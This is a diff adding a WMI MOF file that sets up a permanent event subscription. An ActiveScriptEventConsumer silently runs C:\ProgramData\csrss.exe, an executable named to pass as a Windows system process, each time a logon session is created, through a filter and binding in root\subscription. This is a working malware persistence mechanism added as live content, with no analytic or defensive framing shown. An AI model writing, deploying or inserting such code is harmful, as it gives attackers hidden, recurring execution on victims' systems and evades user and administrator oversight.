@@ -1,0 +1,25 @@
+#pragma autorecover
+#pragma namespace("\\\\.\\root\\subscription")
+
+instance of ActiveScriptEventConsumer as $Consumer
+{
+    Name = "LogonConsumer";
+    ScriptingEngine = "VBScript";
+    ScriptText = 
+        "Set objShell = CreateObject(\"WScript.Shell\")\n"
+        "objShell.Run \"C:\\ProgramData\\csrss.exe\", 0, False\n";
+};
+
+instance of __EventFilter as $Filter
+{
+    Name = "LogonSessionFilter";
+    EventNamespace = "root\\cimv2";
+    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'";
+    QueryLanguage = "WQL";
+};
+
+instance of __FilterToConsumerBinding as $Binding
+{
+    Filter = $Filter;
+    Consumer = $Consumer;
+};
